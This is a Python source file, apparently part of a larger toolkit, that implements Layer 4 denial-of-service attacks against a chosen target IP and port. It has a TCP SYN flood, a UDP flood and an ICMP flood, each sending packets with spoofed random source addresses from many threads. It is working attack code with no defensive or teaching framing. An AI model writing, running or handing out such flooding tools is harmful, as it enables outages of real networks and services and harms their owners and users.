#!/usr/bin/env python3
"""
Network Attacks Module - Layer 4 Attack Methods
"""

import os
import random
import threading
import time

try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class NetworkAttacks:
    """Advanced Layer 4 Network Attack Methods"""
    
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.active = True
        self.packets_sent = 0
        
    def tcp_syn_flood(self, duration=60, threads=100):
        """TCP SYN Flood Attack"""
        if not SCAPY_AVAILABLE:
            print("❌ Scapy required for TCP SYN flood")
            return
            
        print(f"🚀 Starting TCP SYN flood on {self.target_ip}:{self.target_port}")
        
        def send_syn_packets():
            while self.active:
                try:
                    # Create SYN packet with random source
                    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    src_port = random.randint(1024, 65535)
                    
                    packet = IP(src=src_ip, dst=self.target_ip) / TCP(
                        sport=src_port, 
                        dport=self.target_port, 
                        flags="S",
                        seq=random.randint(1000, 9000)
                    )
                    
                    scapy.send(packet, verbose=0)
                    self.packets_sent += 1
                    
                except Exception as e:
                    pass
                    
        # Start attack threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_syn_packets)
            t.daemon = True
            t.start()
            threads_list.append(t)
            
        # Run for specified duration
        time.sleep(duration)
        self.active = False
        
        print(f"📊 TCP SYN flood completed. Packets sent: {self.packets_sent}")
        
    def udp_flood(self, duration=60, threads=100, packet_size=1024):
        """UDP Flood Attack"""
        if not SCAPY_AVAILABLE:
            print("❌ Scapy required for UDP flood")
            return
            
        print(f"🚀 Starting UDP flood on {self.target_ip}:{self.target_port}")
        
        def send_udp_packets():
            while self.active:
                try:
                    # Create UDP packet with random data
                    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    src_port = random.randint(1024, 65535)
                    data = os.urandom(packet_size)
                    
                    packet = IP(src=src_ip, dst=self.target_ip) / UDP(
                        sport=src_port, 
                        dport=self.target_port
                    ) / data
                    
                    scapy.send(packet, verbose=0)
                    self.packets_sent += 1
                    
                except Exception as e:
                    pass
                    
        # Start attack threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_udp_packets)
            t.daemon = True
            t.start()
            threads_list.append(t)
            
        # Run for specified duration
        time.sleep(duration)
        self.active = False
        
        print(f"📊 UDP flood completed. Packets sent: {self.packets_sent}")
        
    def icmp_flood(self, duration=60, threads=50):
        """ICMP Flood Attack"""
        if not SCAPY_AVAILABLE:
            print("❌ Scapy required for ICMP flood")
            return
            
        print(f"🚀 Starting ICMP flood on {self.target_ip}")
        
        def send_icmp_packets():
            while self.active:
                try:
                    # Create ICMP packet
                    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    
                    packet = IP(src=src_ip, dst=self.target_ip) / ICMP(
                        type=8,  # Echo request
                        code=0,
                        id=random.randint(1, 65535)
                    ) / os.urandom(56)  # Standard ping payload size
                    
                    scapy.send(packet, verbose=0)
                    self.packets_sent += 1
                    
                except Exception as e:
                    pass
                    
        # Start attack threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_icmp_packets)
            t.daemon = True
            t.start()
            threads_list.append(t)
            
        # Run for specified duration
        time.sleep(duration)
        self.active = False
        
        print(f"📊 ICMP flood completed. Packets sent: {self.packets_sent}")